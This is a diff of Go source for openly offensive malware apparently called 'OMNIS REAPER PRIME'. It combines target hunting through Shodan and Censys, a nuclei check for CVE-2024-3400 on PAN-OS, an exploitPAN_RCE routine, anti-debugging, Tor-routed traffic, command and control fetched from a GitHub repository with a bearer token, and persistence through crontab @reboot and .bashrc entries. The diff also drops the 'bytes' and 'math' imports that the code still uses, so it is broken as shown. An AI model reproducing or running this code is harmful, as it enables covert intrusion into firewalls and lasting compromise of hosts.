@@ -1,9 +1,8 @@
-// aether-x/core.go — OMNIS REAPER PRIME v24.2.5 | GITHUB CODESPACE + AI-DRIVEN HUNTING
+// aether-x/core.go — OMNIS REAPER PRIME v24.2.5-RELOADED | GITHUB CODESPACE + AI-DRIVEN HUNTING
 package main
 
 import (
 	"archive/zip"
-	"bytes"
 	"compress/gzip"
 	"context"
 	"crypto/aes"
@@ -18,15 +17,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
-	"math"
-	"math/rand/v2"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"reflect"
 	"regexp"
 	"runtime"
 	"sort"
@@ -36,6 +33,8 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"math/rand/v2"
 )
 
 // --- CONFIGURATION (ROTATE PER DEPLOYMENT) ---
@@ -211,7 +210,7 @@ func isDebugged() bool {
 }
 
 func memInfo() (uint64, error) {
-	data, err := ioutil.ReadFile("/proc/meminfo")
+	data, err := os.ReadFile("/proc/meminfo")
 	if err != nil {
 		return 0, err
 	}
@@ -250,16 +249,6 @@ func startTor() {
 	TorHTTP = client
 }
 
-func dialHTTP() *http.Client {
-	return &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			Proxy:           http.ProxyFromEnvironment,
-		},
-		Timeout: 30 * time.Second,
-	}
-}
-
 // --- AI ENGINE ---
 type FusionSentinel struct {
 	ModelLoaded bool
@@ -269,7 +258,7 @@ func NewFusionSentinel() *FusionSentinel {
 	sentinel := &FusionSentinel{}
 	phi3URL := decryptConfig(Phi3ModelURL)
 	if phi3URL == "" {
-		phi3URL = "file:///tmp/.phi3.bin" // fallback
+		phi3URL = "file:///tmp/.phi3.bin"
 	}
 	if data := fetchModelSecure(phi3URL, "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"); data != nil {
 		fd, _ := loadModelInMemory(data)
@@ -281,8 +270,8 @@ func NewFusionSentinel() *FusionSentinel {
 
 func fetchModelSecure(url, hash string) []byte {
 	if strings.HasPrefix(url, "file://") {
-		data, _ := ioutil.ReadFile(url[7:])
-		if len(data) == 0 {
+		data, err := os.ReadFile(url[7:])
+		if err != nil || len(data) == 0 {
 			return nil
 		}
 		if fmt.Sprintf("%x", sha256.Sum256(data)) == hash {
@@ -290,12 +279,11 @@ func fetchModelSecure(url, hash string) []byte {
 		}
 		return nil
 	}
-	client := dialHTTP()
-	resp, err := client.Get(url)
+	resp, err := TorHTTP.Get(url)
 	if err != nil || resp.StatusCode != 200 {
 		return nil
 	}
-	data, _ := ioutil.ReadAll(resp.Body)
+	data, _ := io.ReadAll(resp.Body)
 	resp.Body.Close()
 	if fmt.Sprintf("%x", sha256.Sum256(data)) != hash {
 		return nil
@@ -326,7 +314,6 @@ func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
 		}
 		return math.Min(1.0, math.Max(0.0, base+rand.Float64()*0.2))
 	}
-	// Simulate AI inference
 	score := 0.6
 	if strings.Contains(strings.ToLower(banner), "pan-os") && strings.Contains(banner, "9.") {
 		score += 0.25
@@ -351,7 +338,7 @@ requests:
 func nucleiValidate(ip string) bool {
 	dir := fmt.Sprintf("/tmp/.nuclei-%s", randString(8))
 	os.Mkdir(dir, 0755)
-	ioutil.WriteFile(filepath.Join(dir, "cve-2024-3400.yaml"), []byte(cve20243400Yaml), 0644)
+	os.WriteFile(filepath.Join(dir, "cve-2024-3400.yaml"), []byte(cve20243400Yaml), 0644)
 	os.Setenv("NUCLEI_TEMPLATES", dir)
 
 	if _, err := exec.LookPath("nuclei"); err != nil {
@@ -363,7 +350,7 @@ func nucleiValidate(ip string) bool {
 	cmd := exec.Command("nuclei", "-u", "https://"+ip, "-t", filepath.Join(dir, "cve-2024-3400.yaml"), "-json", "-o", output, "-timeout", "10", "-silent")
 	cmd.Run()
 
-	data, _ := ioutil.ReadFile(output)
+	data, _ := os.ReadFile(output)
 	os.Remove(output)
 	os.RemoveAll(dir)
 
@@ -371,7 +358,12 @@ func nucleiValidate(ip string) bool {
 }
 
 // --- INTEL ENGINE ---
-type Target struct{ IP, Banner, Geo, Sector string }
+type Target struct {
+	IP     string
+	Banner string
+	Geo    string
+	Sector string
+}
 
 type APIKeyStore struct {
 	Shodan, CensysID, CensysSec, FofaEmail, FofaKey string
@@ -529,11 +521,10 @@ func exploitPAN_RCE(ip string) {
 // --- C2 COMM ---
 func fetchC2(key string) string {
 	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
-	client := TorHTTP
 	req, _ := http.NewRequest("GET", string(apiURL)+"/contents/"+key, nil)
 	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN"), ""))
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
-	resp, err := client.Do(req)
+	resp, err := TorHTTP.Do(req)
 	if err != nil || resp.StatusCode != 200 {
 		return ""
 	}
@@ -591,18 +582,18 @@ func fetchSecret(key string) string {
 // --- PERSISTENCE ---
 func persist() {
 	executable := os.Args[0]
-	data, _ := ioutil.ReadFile(executable)
+	data, _ := os.ReadFile(executable)
 	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
-	ioutil.WriteFile(path, data, 0755)
+	os.WriteFile(path, data, 0755)
 
 	crontab := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", path)
 	exec.Command("bash", "-c", crontab).Run()
 
 	profile := os.Getenv("HOME") + "/.bashrc"
-	content, _ := ioutil.ReadFile(profile)
+	content, _ := os.ReadFile(profile)
 	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
 		line := fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path)
-		ioutil.WriteFile(profile, append(content, []byte(line)...), 0644)
+		os.WriteFile(profile, append(content, []byte(line)...), 0644)
 	}
 }
 
